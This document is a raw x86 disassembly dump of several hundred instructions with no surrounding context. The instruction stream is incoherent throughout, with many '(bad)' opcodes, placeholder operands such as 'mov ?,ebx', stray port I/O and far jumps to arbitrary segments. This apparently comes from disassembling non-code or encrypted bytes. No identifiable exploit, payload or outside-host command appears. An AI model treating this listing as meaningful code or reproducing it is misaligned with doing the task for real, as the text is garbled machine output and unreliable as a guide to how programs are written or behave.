  43f6eb:	mov    WORD PTR [ecx+0x6],ds
  43f6ee:	aas    
  43f6ef:	gs cld 
  43f6f1:	pop    ss
  43f6f2:	shr    DWORD PTR cs:[ebx],0xe8
  43f6f6:	push   ss
  43f6f7:	mov    eax,ds:0x49a2ab7a
  43f6fc:	pop    es
  43f6fd:	mov    ebx,0x1351a278
  43f702:	xchg   edx,eax
  43f703:	push   0xffffff9e
  43f705:	je     0x43f68c
  43f707:	sbb    eax,0xa190100a
  43f70c:	and    eax,0x2e080ae2
  43f711:	mov    edx,0x2a169ecd
  43f716:	iret   
  43f717:	mov    al,ds:0xca7f9b9
  43f71c:	ret    
  43f71d:	push   esi
  43f71e:	les    esp,FWORD PTR [ecx+0x4190ac37]
  43f724:	pop    eax
  43f725:	pushf  
  43f726:	es jns 0x43f774
  43f729:	mov    esi,0x810bcfee
  43f72e:	enter  0xe895,0xd0
  43f732:	and    al,0xa1
  43f734:	stos   DWORD PTR es:[edi],eax
  43f735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f736:	mov    dl,0x3
  43f738:	addr16 push ss
  43f73a:	cwde   
  43f73b:	push   ss
  43f73c:	push   ecx
  43f73d:	inc    eax
  43f73e:	pop    esp
  43f73f:	in     al,0x9e
  43f741:	xchg   edx,eax
  43f742:	neg    dh
  43f744:	ja     0x43f709
  43f746:	and    BYTE PTR [edx+0x14af9553],ah
  43f74c:	shl    ebx,0x60
  43f74f:	push   ecx
  43f750:	xor    edi,DWORD PTR [esi+ebp*8-0x16219d73]
  43f757:	mov    ch,0xf8
  43f759:	pop    ebp
  43f75a:	mov    esi,0xba21bea0
  43f75f:	sub    eax,eax
  43f761:	call   0x9452:0xd33a6c1e
  43f768:	pop    edi
  43f769:	sub    DWORD PTR [edi+0x23005ace],edx
  43f76f:	out    0x6e,eax
  43f771:	sbb    BYTE PTR [edx],bl
  43f773:	stos   DWORD PTR es:[edi],eax
  43f774:	dec    ebp
  43f775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f776:	outs   dx,BYTE PTR ds:[esi]
  43f777:	jne    0x43f746
  43f779:	jp     0x43f71a
  43f77b:	inc    eax
  43f77c:	addr16 sbb al,0xe9
  43f77f:	jno    0x43f7c2
  43f781:	or     esp,0x341a9ee2
  43f787:	iret   
  43f788:	dec    edi
  43f789:	inc    edx
  43f78a:	mov    dh,0x32
  43f78c:	fstp   st(1)
  43f78e:	sahf   
  43f78f:	pop    ds
  43f790:	xchg   esp,eax
  43f791:	loopne 0x43f757
  43f793:	clc    
  43f794:	pop    eax
  43f795:	jge    0x43f785
  43f797:	(bad)  
  43f799:	dec    ebp
  43f79a:	jb     0x43f75c
  43f79c:	(bad)  
  43f79d:	sbb    bl,cl
  43f79f:	mov    ds:0x517cc07f,al
  43f7a4:	in     al,dx
  43f7a5:	fmul   DWORD PTR [esi+0x53]
  43f7a8:	test   al,0x7e
  43f7aa:	out    dx,eax
  43f7ab:	out    0x54,eax
  43f7ad:	lods   al,BYTE PTR ds:[esi]
  43f7ae:	loopne 0x43f76f
  43f7b0:	dec    edx
  43f7b1:	pusha  
  43f7b2:	out    0x56,eax
  43f7b4:	outs   dx,BYTE PTR ds:[esi]
  43f7b5:	push   esi
  43f7b6:	dec    ecx
  43f7b7:	jmp    0xa1b6:0xa32513fe
  43f7be:	(bad)  
  43f7c0:	sahf   
  43f7c1:	fmulp  st(6),st
  43f7c3:	mov    edi,DWORD PTR [edi+0x51]
  43f7c6:	out    dx,al
  43f7c7:	mov    al,0x80
  43f7c9:	sub    DWORD PTR [eax+0x57fc5806],ebp
  43f7cf:	mov    eax,ds:0x4088f439
  43f7d4:	aaa    
  43f7d5:	int3   
  43f7d6:	pusha  
  43f7d7:	mov    BYTE PTR [esi+0x31],bl
  43f7da:	sub    bl,BYTE PTR [eax]
  43f7dc:	es mov dh,0x5b
  43f7df:	loope  0x43f84f
  43f7e1:	jo     0x43f817
  43f7e3:	dec    esi
  43f7e4:	(bad)  
  43f7e6:	not    BYTE PTR [ecx+0x3f8a6b5e]
  43f7ec:	pop    ecx
  43f7ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f7ef:	jmp    0x7fb0520e
  43f7f4:	ret    0x9ac8
  43f7f7:	mov    cl,0x9
  43f7f9:	fadd   QWORD PTR [esi+0x13]
  43f7fc:	pop    esi
  43f7fd:	mov    BYTE PTR [ebx+0x4097b4f0],dh
  43f803:	in     al,0xe6
  43f805:	pusha  
  43f806:	dec    ebx
  43f807:	mov    esp,0x2b156b78
  43f80c:	fisttp DWORD PTR [esi+ebp*8-0x69]
  43f810:	sub    al,0x2c
  43f812:	lods   eax,DWORD PTR ds:[esi]
  43f813:	repnz das 
  43f815:	call   0x56df:0x6025ebf1
  43f81c:	shl    DWORD PTR [esi-0x4b050c57],cl
  43f822:	adc    eax,0xce885e66
  43f827:	xor    edi,DWORD PTR [edi+ecx*2]
  43f82a:	adc    ebp,ebx
  43f82c:	jnp    0x43f88e
  43f82e:	push   ebx
  43f82f:	test   eax,0x82b48d31
  43f834:	mov    bh,0x5f
  43f836:	out    dx,al
  43f837:	or     DWORD PTR [esp+eax*2],eax
  43f83a:	int    0x7a
  43f83c:	ins    BYTE PTR es:[edi],dx
  43f83d:	lahf   
  43f83e:	xor    ah,BYTE PTR [ecx+0x72cea4dc]
  43f844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f845:	pop    ecx
  43f846:	push   ebp
  43f847:	stos   DWORD PTR es:[edi],eax
  43f848:	pop    ebx
  43f849:	(bad)  
  43f84a:	call   DWORD PTR [edi+edx*8+0x4eaf97f6]
  43f851:	and    ch,0x3e
  43f854:	push   0x60
  43f856:	ds fwait
  43f858:	and    bh,dl
  43f85a:	mov    edi,0xfb214057
  43f85f:	push   ds
  43f860:	xchg   edx,eax
  43f861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f862:	out    dx,al
  43f863:	jno    0x43f866
  43f865:	jp     0x43f891
  43f867:	push   esp
  43f868:	in     al,dx
  43f869:	pop    ecx
  43f86a:	jmp    0xcc31:0x7b8f8a4a
  43f871:	push   ecx
  43f872:	in     al,0x33
  43f874:	pop    ebx
  43f875:	imul   ecx,esi,0x2d
  43f878:	rol    ecx,1
  43f87a:	mov    gs,WORD PTR [ecx]
  43f87c:	sti    
  43f87d:	cmp    eax,0x7041a0ba
  43f882:	sbb    DWORD PTR [edi-0x72],edx
  43f885:	push   ds
  43f886:	push   edi
  43f887:	or     eax,0xee31de12
  43f88c:	fs (bad) 
  43f88e:	test   eax,0x6102a8
  43f893:	and    eax,0xa0d3478b
  43f898:	sbb    BYTE PTR [edx-0x1b5930ef],al
  43f89e:	or     eax,eax
  43f8a0:	pop    ebp
  43f8a1:	or     DWORD PTR [ebx],ecx
  43f8a3:	mov    ?,ebx
  43f8a5:	lods   al,BYTE PTR ds:[esi]
  43f8a6:	fsubr  st,st(4)
  43f8a8:	jle    0x43f8a2
  43f8aa:	dec    edi
  43f8ab:	neg    DWORD PTR [esi-0x104eba3]
  43f8b1:	mov    esp,0xa5e658f4
  43f8b6:	xlat   BYTE PTR ds:[ebx]
  43f8b7:	(bad)  
  43f8b8:	arpl   WORD PTR [edi+ebp*4],bp
  43f8bb:	sbb    ebx,DWORD PTR [ebx-0x15529880]
  43f8c1:	or     bl,al
  43f8c3:	adc    ah,dh
  43f8c5:	fs sbb al,0xa0
  43f8c8:	out    0xe4,eax
  43f8ca:	mov    ch,0xc6
  43f8cc:	xchg   ecx,eax
  43f8cd:	loopne 0x43f8ff
  43f8cf:	mov    ds:0xa0f51211,eax
  43f8d4:	enter  0xfb97,0xa
  43f8d8:	(bad)  
  43f8d9:	lods   eax,DWORD PTR ds:[esi]
  43f8da:	jecxz  0x43f87b
  43f8dc:	pop    esi
  43f8dd:	arpl   si,di
  43f8df:	sbb    edi,DWORD PTR [ebx+0x3e]
  43f8e2:	cdq    
  43f8e3:	and    BYTE PTR [ebp+0x5e811f08],al
  43f8e9:	shr    BYTE PTR [esi-0x3b],0x47
  43f8ed:	shr    DWORD PTR [edi+0x179ec18],1
  43f8f3:	cmp    ebx,ecx
  43f8f5:	fisubr WORD PTR [esi+0x231fd469]
  43f8fb:	and    eax,0xd4b06149
  43f900:	mov    WORD PTR [ebp+0x6464213a],?
  43f906:	out    dx,al
  43f907:	nop
  43f908:	test   DWORD PTR [esi-0x5f],0x2fcabcf9
  43f90f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f910:	inc    ecx
  43f911:	add    al,0x4f
  43f913:	aas    
  43f914:	repz push ss
  43f916:	xchg   ecx,edx
  43f918:	aad    0x29
  43f91a:	int    0x5c
  43f91c:	pusha  
  43f91d:	gs sbb al,0x1a
  43f920:	sbb    eax,0x2161895c
  43f925:	inc    ebp
  43f926:	or     al,0x89
  43f928:	xchg   ecx,eax
  43f929:	cmp    BYTE PTR [eax-0x1c357aaf],dl
  43f92f:	lea    ebx,[esi+0x74]
  43f932:	pop    edi
  43f933:	xor    eax,0x7400ef82
  43f938:	pusha  
  43f939:	popa   
  43f93a:	push   DWORD PTR [eax+0x36]
  43f93d:	dec    ebx
  43f93e:	aas    
  43f93f:	dec    esi
  43f940:	push   ds
  43f941:	sub    dh,0xf
  43f944:	imul   ebp,DWORD PTR [ebx],0x6dd1bef
  43f94a:	(bad)  
  43f94b:	mov    al,ds:0xf276aaa4
  43f950:	in     al,0x75
  43f952:	daa    
  43f953:	inc    ebp
  43f954:	push   esp
  43f955:	pop    ecx
  43f956:	sbb    BYTE PTR ss:[eax],ah
  43f959:	(bad)  
  43f95a:	call   0x4813:0xe1c0f617
  43f961:	mov    ebp,0x6096f0d5
  43f966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f967:	leave  
  43f968:	repz mov edi,0x48339932
  43f96e:	and    BYTE PTR [ebp-0x4786acf7],dl
  43f974:	icebp  
  43f975:	std    
  43f976:	and    eax,DWORD PTR [ecx]
  43f978:	(bad)  
  43f979:	rol    al,0x80
  43f97c:	cs push esp
  43f97e:	jnp    0x43f924
  43f980:	cmp    esi,DWORD PTR [eax-0x79]
  43f983:	or     edi,ebx
  43f985:	mov    ds:0x57def953,eax
  43f98a:	or     al,0x66
  43f98c:	pop    esi
  43f98d:	fdivr  DWORD PTR [edi+esi*1]
  43f990:	or     al,0x6e
  43f992:	repz fdiv QWORD PTR [ebp+0x6e198b60]
  43f999:	and    al,0xcd
  43f99b:	pop    ebx
  43f99c:	mov    eax,0x7d4d63a8
  43f9a1:	add    eax,0x4183b5e9
  43f9a6:	xchg   esi,eax
  43f9a7:	mov    eax,0xd57f20de
  43f9ac:	fldenv [eax-0x11]
  43f9af:	push   esp
  43f9b0:	fcmovne st,st(2)
  43f9b2:	jmp    0x43f9d6
  43f9b4:	dec    esp
  43f9b5:	leave  
  43f9b6:	fsubr  DWORD PTR [esi+0x368dad5e]
  43f9bc:	mov    esp,0xeac38aba
  43f9c1:	pusha  
  43f9c2:	mov    ebx,0x411f604c
  43f9c7:	je     0x43fa16
  43f9c9:	clc    
  43f9ca:	out    dx,al
  43f9cb:	imul   ebx,DWORD PTR [ebp+0x4],0xb3d7872
  43f9d2:	mov    al,0xea
  43f9d4:	mov    al,ds:0xb37af441
  43f9d9:	pop    ebp
  43f9da:	mov    cl,0x5e
  43f9dc:	addr16 jmp 0xf23fe760
  43f9e2:	out    0xd7,eax
  43f9e4:	push   ecx
  43f9e5:	or     BYTE PTR [ebx+0x5c],bl
  43f9e8:	fidivr WORD PTR [eax-0x2e]
  43f9eb:	popf   
  43f9ec:	jns    0x43fa0f
  43f9ee:	xchg   esi,eax
  43f9ef:	xchg   esp,eax
  43f9f0:	icebp  
  43f9f1:	cwde   
  43f9f2:	jne    0x43f982
  43f9f4:	retf   
  43f9f5:	xchg   ecx,eax
  43f9f6:	add    DWORD PTR [ecx],eax
  43f9f8:	pop    esi
  43f9f9:	adc    esp,DWORD PTR [ebp-0x69]
  43f9fc:	scas   eax,DWORD PTR es:[edi]
  43f9fd:	or     al,0xee
  43f9ff:	xchg   bh,al
  43fa01:	jae    0x43f9e9
  43fa03:	call   0x1122:0xc8541392
  43fa0a:	mov    esi,0x411d5e83
  43fa0f:	dec    edx
  43fa10:	loop   0x43f9dc
  43fa12:	or     esi,DWORD PTR [esi-0x42648355]
  43fa18:	shl    DWORD PTR [eax+0x25],cl
  43fa1b:	cmp    edi,ecx
  43fa1d:	shl    BYTE PTR [ebx+0x76],1
  43fa20:	(bad)  
  43fa21:	jmp    0x43fa11
  43fa23:	sbb    eax,0x67b5f053
  43fa28:	xchg   esp,eax
  43fa29:	xchg   esp,eax
  43fa2a:	cld    
  43fa2b:	mov    al,ds:0xdf00cad7
  43fa30:	retf   
  43fa31:	cmp    BYTE PTR [eax-0x3e09a183],bl
  43fa37:	je     0x43fa4d
  43fa39:	out    0x63,eax
  43fa3b:	loopne 0x43fa49
  43fa3d:	sub    eax,esp
  43fa3f:	stos   DWORD PTR es:[edi],eax
  43fa40:	arpl   WORD PTR [esi],cx
  43fa42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa43:	shl    BYTE PTR [ebp+0x6d],1
  43fa46:	push   es
  43fa47:	mov    bl,0x5e
  43fa49:	sub    al,0x6a
  43fa4b:	div    DWORD PTR [edi+edx*1-0x7c285910]
  43fa52:	and    ecx,0x14255a0d
  43fa58:	scas   al,BYTE PTR es:[edi]
  43fa59:	pusha  
  43fa5a:	stos   BYTE PTR es:[edi],al
  43fa5b:	mov    edi,0x3026e48
  43fa60:	cld    
  43fa61:	jge    0x43fa51
  43fa63:	xchg   ecx,eax
  43fa64:	mov    ecx,0xff63c08
  43fa69:	sub    eax,0x9ba8a17d
  43fa6e:	mov    eax,0xc8ba2b28
  43fa73:	mov    BYTE PTR [esi+0x2f],bl
  43fa76:	jae    0x43fada
  43fa78:	out    dx,eax
  43fa79:	out    0xfb,eax
  43fa7b:	jns    0x43fa29
  43fa7d:	pusha  
  43fa7e:	lock mov ah,0x8a
  43fa81:	cmp    al,0xd5
  43fa83:	cmp    DWORD PTR [ebp+0x3e0ee26],0x69
  43fa8a:	retf   
  43fa8b:	xor    BYTE PTR ds:0x38a7d3cb,cl
  43fa91:	cdq    
  43fa92:	mov    eax,0xf7507b6a
  43fa97:	push   ebp
  43fa98:	loope  0x43fa51
  43fa9a:	out    dx,al
  43fa9b:	mov    bh,0xab
  43fa9d:	cld    
  43fa9e:	and    esp,ebx
  43faa0:	sar    DWORD PTR [edi+0x4a],cl
  43faa3:	mov    eax,ds:0xd21c809b
  43faa8:	sbb    cl,BYTE PTR [eax-0x30a1e4a5]
  43faae:	xchg   edx,eax
  43faaf:	fidiv  DWORD PTR [eax+eiz*1]
  43fab2:	xchg   si,ax
  43fab4:	jae    0x43fa5a
  43fab6:	outs   dx,BYTE PTR ds:[esi]
  43fab7:	out    dx,al
  43fab8:	jo     0x43fae6
  43faba:	sbb    ebp,DWORD PTR [eax-0xcf85626]
  43fac0:	xor    eax,DWORD PTR [ebx]
  43fac2:	scas   al,BYTE PTR es:[edi]
  43fac3:	sbb    al,0xba
  43fac5:	xor    BYTE PTR [ebp+0x1c3e5ee8],0x6e
  43facc:	mov    gs,WORD PTR [edi+0x60ed96b1]
  43fad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fad3:	fst    QWORD PTR [esi-0xc]
  43fad6:	test   DWORD PTR [edx+0x5fee8c23],esp
  43fadc:	jl     0x43fa7e
  43fade:	arpl   WORD PTR [esi],sp
  43fae0:	sub    bl,BYTE PTR [ebx+0x306ab130]
  43fae6:	ret    0x3e9e
  43fae9:	das    
  43faea:	out    dx,al
  43faeb:	in     al,0xcf
  43faed:	jno    0x43fac8
  43faef:	xchg   ebx,eax
  43faf0:	scas   al,BYTE PTR es:[edi]
  43faf1:	sub    eax,0x983fa12b
  43faf6:	push   edi
  43faf7:	adc    DWORD PTR [edi-0x58],edi
  43fafa:	popf   
  43fafb:	add    DWORD PTR [eax-0x39],edx
  43fafe:	pusha  
  43faff:	mov    cl,0x5b
  43fb01:	lods   eax,DWORD PTR ds:[esi]
  43fb02:	inc    eax
  43fb03:	ja     0x43fad3
  43fb05:	jge    0x43fa92
  43fb07:	mov    ebx,0xe2156167
  43fb0c:	sub    DWORD PTR [edi+ecx*2+0x5d],ecx
  43fb10:	adc    BYTE PTR [esi-0x12],bl
  43fb13:	mov    BYTE PTR [edx],al
  43fb15:	jl     0x43fb1f
  43fb17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fb18:	lea    edx,ds:0xacf8cd0c
  43fb1e:	push   DWORD PTR [eax]
  43fb20:	and    eax,0x40
  43fb23:	hlt    
  43fb24:	cmc    
  43fb25:	and    al,0x5a
  43fb27:	les    ebx,FWORD PTR [esi-0x5]
  43fb2a:	xchg   esi,eax
  43fb2b:	cmp    dl,BYTE PTR [esi+0x16]
  43fb2e:	cmp    ebp,DWORD PTR [eax-0x39]
  43fb31:	and    edi,ebx
  43fb33:	mov    ds,WORD PTR [eax]
  43fb35:	out    0x25,al
  43fb37:	nop
  43fb38:	sub    eax,0xc122ee67
  43fb3d:	fcomp  QWORD PTR [ebx-0x11c2e2fc]
  43fb43:	sub    al,0x15
  43fb45:	jb     0x43faee
  43fb47:	jno    0x43fae7
  43fb49:	pop    ecx
  43fb4a:	cmp    ah,BYTE PTR [edx+0x4b186dc2]
  43fb50:	es or  edx,esi
  43fb53:	push   0xf0eeb7b6
  43fb58:	pop    esp
  43fb59:	inc    esp
  43fb5a:	and    DWORD PTR [ebx-0x21],0x42a884c4
  43fb61:	jns    0x43fbae
  43fb63:	add    eax,0x156ec168
  43fb68:	pop    ebx
  43fb69:	sahf   
  43fb6a:	out    dx,al
  43fb6b:	test   al,0xc4
  43fb6d:	lock rol al,0xf1
  43fb71:	pop    es
  43fb72:	add    eax,0x385269ed
  43fb77:	xchg   ecx,eax
  43fb78:	rep outs dx,BYTE PTR ds:[esi]
  43fb7a:	mov    es,WORD PTR [eax-0x2]
  43fb7d:	fldcw  WORD PTR [esi+0x19]
  43fb80:	pop    esi
  43fb81:	mov    bl,0x3d
  43fb83:	sub    DWORD PTR [eax-0x3d],ecx
  43fb86:	hlt    
  43fb87:	bnd je 0x43fbea
  43fb8a:	mov    ecx,0xb66351f8
  43fb8f:	jg     0x43fb35
  43fb91:	aas    
  43fb92:	pop    ds
  43fb93:	dec    ebp
  43fb94:	jg     0x43fb72
  43fb96:	cmp    BYTE PTR [edx+eiz*8],dl
  43fb99:	and    eax,0xdb311a6e
  43fb9e:	mov    al,0xa0
  43fba0:	or     esi,esi
  43fba2:	into   
  43fba3:	fwait
  43fba4:	mov    bh,0x69
  43fba6:	outs   dx,BYTE PTR ds:[esi]
  43fba7:	ficomp WORD PTR [edi-0x23]
  43fbaa:	rcr    ebx,cl
  43fbac:	push   DWORD PTR [esi+0x13]
  43fbaf:	pop    edx
  43fbb0:	aaa    
  43fbb1:	stos   BYTE PTR es:[edi],al
  43fbb2:	out    0x59,al
  43fbb4:	addr16 icebp 
  43fbb6:	in     al,dx
  43fbb7:	inc    esp
  43fbb8:	ficom  WORD PTR [ebx]
  43fbba:	mov    ebx,0xe0a2f223
  43fbbf:	mov    ch,0x33
  43fbc1:	xchg   edx,eax
  43fbc2:	xchg   ebx,eax
  43fbc3:	and    DWORD PTR [eax],esi
  43fbc5:	xchg   DWORD PTR [esi-0x1],ecx
  43fbc8:	xchg   ebp,eax
  43fbc9:	ret    0xf3e1
  43fbcc:	les    esp,FWORD PTR [eax+0xa]
  43fbcf:	inc    esi
  43fbd0:	sbb    bh,BYTE PTR [edi+edx*8-0x11c20740]
  43fbd7:	inc    edi
  43fbd8:	sub    bh,bh
  43fbda:	and    DWORD PTR [edi-0x5ecd9fd3],0x1b45ab93
  43fbe4:	out    dx,eax
  43fbe5:	in     eax,dx
  43fbe6:	mov    DWORD PTR [edi],esi
  43fbe8:	dec    ebx
  43fbe9:	jno    0x43fbec
  43fbeb:	arpl   WORD PTR [esi+0x6c],bx
  43fbee:	cmp    ebp,DWORD PTR [ecx]
  43fbf0:	mov    bl,0x45
  43fbf2:	and    esp,DWORD PTR [ecx+0x4d7eb70f]
  43fbf8:	jmp    0x6aa8153a
  43fbfd:	enter  0xbee,0xb7
  43fc01:	jecxz  0x43fc76
  43fc03:	les    ebx,FWORD PTR [esi-0x5b3715c1]
  43fc09:	lahf   
  43fc0a:	out    dx,al
  43fc0b:	lahf   
  43fc0c:	jecxz  0x43fc76
  43fc0e:	cmp    ebp,ecx
  43fc10:	inc    esi
  43fc11:	data16 out dx,al
  43fc13:	xchg   edx,eax
  43fc14:	outs   dx,DWORD PTR ds:[esi]
  43fc15:	out    dx,eax
  43fc16:	mov    al,ds:0x703b5b41
  43fc1b:	mov    eax,ds:0xe3fbb2f2
  43fc20:	subps  xmm1,XMMWORD PTR [esp+ecx*2+0x34]
  43fc25:	nop
  43fc26:	les    esp,FWORD PTR [eax-0x6cfab9c8]
  43fc2c:	push   0x17
  43fc2e:	lods   al,BYTE PTR ds:[esi]
  43fc2f:	mov    al,ds:0x2e076586
  43fc34:	jbe    0x43fbd3
  43fc36:	fidivr DWORD PTR [ecx+0x5e]
  43fc39:	into   
  43fc3a:	sbb    eax,0xf6c9929f
  43fc3f:	xor    esi,edx
  43fc41:	pusha  
  43fc42:	pop    ds
  43fc43:	sub    DWORD PTR [ecx],edx
  43fc45:	loopne 0x43fc74
  43fc47:	dec    ecx
  43fc48:	sub    bh,dl
  43fc4a:	out    dx,al
  43fc4b:	pop    eax
  43fc4c:	sbb    dl,0x67
  43fc4f:	pusha  
  43fc50:	pop    ds
  43fc51:	add    DWORD PTR [edi],ebx
  43fc53:	mov    eax,ds:0x896e6b1d
  43fc58:	inc    edi
  43fc59:	jo     0x43fc56
  43fc5b:	jnp    0x43fcbd
  43fc5d:	mov    dl,0xa4
  43fc5f:	cmp    esi,edi
  43fc61:	push   edx
  43fc62:	mov    al,0x60
  43fc64:	fild   WORD PTR [edx+0x499e970e]
  43fc6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fc6b:	mov    eax,ds:0x9c4b2a01
  43fc70:	xor    eax,0xa69e2464
  43fc75:	pusha  
  43fc76:	sub    esp,esp
  43fc78:	sub    eax,0x498ea4d3
  43fc7d:	pusha  
  43fc7e:	mov    ch,0xdf
  43fc80:	dec    esp
  43fc81:	mov    edx,0x911b307e
  43fc86:	mov    esi,0x541d31f6
  43fc8b:	lahf   
  43fc8c:	(bad)  
  43fc8d:	cwde   
  43fc8e:	iret   
  43fc8f:	inc    eax
  43fc90:	push   sp
  43fc92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fc93:	and    ch,BYTE PTR [ebp-0x11392da0]
  43fc99:	mov    ss,WORD PTR [eax]
  43fc9b:	mov    ecx,ecx
  43fc9d:	mov    ch,0xf7
  43fc9f:	sub    ah,BYTE PTR [ebx]
  43fca1:	mov    esi,ebp
  43fca3:	lods   al,BYTE PTR ds:[esi]
  43fca4:	cs sbb cl,dh
  43fca7:	pop    ebp
  43fca8:	inc    esi
  43fca9:	popa   
  43fcaa:	mov    BYTE PTR [ebx+edi*8],bh
  43fcad:	pop    ds
  43fcae:	push   edx
  43fcaf:	sahf   
  43fcb0:	push   0x5ec1e531
  43fcb5:	daa    
  43fcb6:	add    al,0x38
  43fcb8:	sbb    ecx,DWORD PTR [eax-0x7a]
  43fcbb:	pop    ds
  43fcbc:	cdq    
  43fcbd:	inc    esp
  43fcbe:	jmp    0x5021:0x2607fc2
  43fcc5:	imul   esp,esi,0x31e65ea6
  43fccb:	add    edi,DWORD PTR [ebp-0x2]
  43fcce:	out    dx,eax
  43fccf:	arpl   WORD PTR [edx+0x28],cx
  43fcd2:	arpl   WORD PTR [ecx+0x3ac2cf13],sp
  43fcd8:	jno    0x43fc5b
  43fcda:	push   0xda226454
  43fcdf:	xlat   BYTE PTR ds:[ebx]
  43fce0:	sub    esp,ebx
  43fce2:	add    DWORD PTR [eax],esp
  43fce4:	mov    dl,0x1d
  43fce6:	out    dx,al
  43fce7:	stc    
  43fce8:	popf   
  43fce9:	repnz inc ebp
  43fceb:	push   cs
  43fcec:	fwait
  43fced:	adc    al,0x25
  43fcef:	stos   DWORD PTR es:[edi],eax
  43fcf0:	jns    0x43fcd2
  43fcf2:	and    eax,0xa5af1c6f
  43fcf7:	rcr    ah,cl
  43fcf9:	pusha  
  43fcfa:	mov    bh,0x22
  43fcfc:	dec    DWORD PTR [edi+esi*1-0x53]
  43fd00:	and    al,0xd6
  43fd02:	out    dx,al
  43fd03:	and    al,0x17
  43fd05:	xchg   BYTE PTR [esp+eiz*2-0x5a6e54ae],dh
  43fd0c:	scas   al,BYTE PTR es:[edi]
  43fd0d:	jle    0x43fd84
  43fd0f:	arpl   WORD PTR [edx-0x1f],sp
  43fd12:	jge    0x43fd92
  43fd14:	mov    bh,BYTE PTR [eax-0x75a1441d]
  43fd1a:	enter  0x4f85,0xd6
  43fd1e:	(bad)  
  43fd1f:	imul   edx,esi,0x830c0060
  43fd25:	pop    esp
  43fd26:	in     eax,0x4e
  43fd28:	push   ss
  43fd29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fd2a:	out    dx,al
  43fd2b:	lea    ebp,[ecx]
  43fd2d:	pusha  
  43fd2e:	imul   ebx,DWORD PTR [ebp+ebx*8-0x7],0x67a8ed4
  43fd36:	sub    ah,BYTE PTR [ecx]
  43fd38:	mov    BYTE PTR [edx-0x2dd3d2f6],ah
  43fd3e:	out    dx,al
  43fd3f:	cld    
  43fd40:	fsub   st(2),st
  43fd42:	in     eax,dx
  43fd43:	fwait
  43fd44:	mov    edi,0x35a11630
  43fd49:	xchg   esp,eax
  43fd4a:	adc    DWORD PTR [eax-0xb700364],0x60
  43fd51:	sub    al,0x4c
  43fd53:	mov    esi,0xe0f7dd7d
  43fd58:	popa   
  43fd59:	dec    ecx
  43fd5a:	cmp    eax,0x5d0071a1
  43fd5f:	nop
  43fd60:	mov    edi,0x5ebb6203
  43fd65:	ins    DWORD PTR es:[edi],dx
  43fd66:	adc    ebx,edx
  43fd68:	data16 shl bh,0xa3
  43fd6c:	out    dx,al
  43fd6d:	pusha  
  43fd6e:	mov    ds:0x2897ed0c,eax
  43fd73:	inc    eax
  43fd74:	jmp    0x7008:0xbbfaeece
  43fd7b:	cdq    
  43fd7c:	mov    bl,0x73
  43fd7e:	lds    esp,FWORD PTR [eax+0x53e2ac64]
  43fd84:	xchg   DWORD PTR [eax+0x425e431b],esi
  43fd8a:	dec    eax
  43fd8b:	jne    0x43fe0b
  43fd8d:	int    0x69
  43fd8f:	sbb    dh,dl
  43fd91:	pusha  
  43fd92:	cmp    BYTE PTR [esp+esi*8-0x1b],ch
  43fd96:	or     ebp,DWORD PTR [ebx+0x14ee0cb3]
  43fd9c:	jmp    0x6af9:0x2c96c0fe
  43fda3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fda4:	pop    esp
  43fda5:	nop
  43fda6:	loop   0x43fded
  43fda8:	inc    edi
  43fda9:	cmp    esp,DWORD PTR [esi+0x2a]
  43fdac:	push   eax
  43fdad:	sbb    esi,ebp
  43fdaf:	in     al,0x36
  43fdb1:	or     al,0x34
  43fdb3:	sahf   
  43fdb4:	ja     0x43fd81
  43fdb6:	je     0x43fd59
  43fdb8:	and    ecx,esp
  43fdba:	(bad)  
  43fdbb:	fs mov edx,0xf82d330e
  43fdc1:	scas   eax,DWORD PTR es:[edi]
  43fdc2:	out    dx,al
  43fdc3:	(bad)  
  43fdc4:	push   ecx
  43fdc5:	js     0x43fd49
  43fdc7:	outs   dx,DWORD PTR ds:[esi]
  43fdc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fdc9:	push   0x869a0f1
  43fdce:	in     eax,0x64
  43fdd0:	icebp  
  43fdd1:	xor    dl,BYTE PTR [esi]
  43fdd3:	jmp    0x43fe33
  43fdd5:	and    eax,0x85cc68f
  43fdda:	rcl    BYTE PTR [esp+ebp*4+0x60],0x4d
  43fddf:	into   
  43fde0:	jne    0x43fd88
  43fde2:	mov    ah,0xe9
  43fde4:	and    ah,BYTE PTR [esi+ebp*8-0x2]
  43fde8:	adc    ah,BYTE PTR [edx+esi*2]
  43fdeb:	popa   
  43fdec:	inc    ebp
  43fded:	int3   
  43fdee:	jle    0x43fdb7
  43fdf0:	dec    esi
  43fdf1:	inc    ebx
  43fdf2:	fisub  WORD PTR [eax+0x4263c800]
  43fdf8:	xchg   ebx,eax
  43fdf9:	add    al,0xed
  43fdfb:	dec    ebx
  43fdfc:	repnz jmp 0xf136:0xc2e3eb1b
  43fe04:	xchg   esi,eax
  43fe05:	pop    esp
  43fe06:	mov    es:0x20cf1581,eax
  43fe0c:	bound  edi,QWORD PTR [edx]
  43fe0e:	and    DWORD PTR [edx],ecx
  43fe10:	pop    esi
  43fe11:	add    al,0xba
  43fe13:	ss cld 
  43fe15:	repz out 0x99,al
  43fe18:	(bad)  [eax-0x62]
  43fe1b:	add    al,0x42
  43fe1d:	(bad)  
  43fe1f:	sahf   
  43fe20:	cmp    DWORD PTR [eax+0x7d54c9f0],esi
  43fe26:	mov    edx,0x47b68960
  43fe2b:	xor    ecx,DWORD PTR [edx+0x49873c60]
  43fe31:	mov    edi,0xbd5de3de
  43fe36:	clc    
  43fe37:	pusha  
  43fe38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fe39:	jp     0x43fe29
  43fe3b:	mov    dl,0xa3
  43fe3d:	(bad)  
  43fe3f:	inc    edx
